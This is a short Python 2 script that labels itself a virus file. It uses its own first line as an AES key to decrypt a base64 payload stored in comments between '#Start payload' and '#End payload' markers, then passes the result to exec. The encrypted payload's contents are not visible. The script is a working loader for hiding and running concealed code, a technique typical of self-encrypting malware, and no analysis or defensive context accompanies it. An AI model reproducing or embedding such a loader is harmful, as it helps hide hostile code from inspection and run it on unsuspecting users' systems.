print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload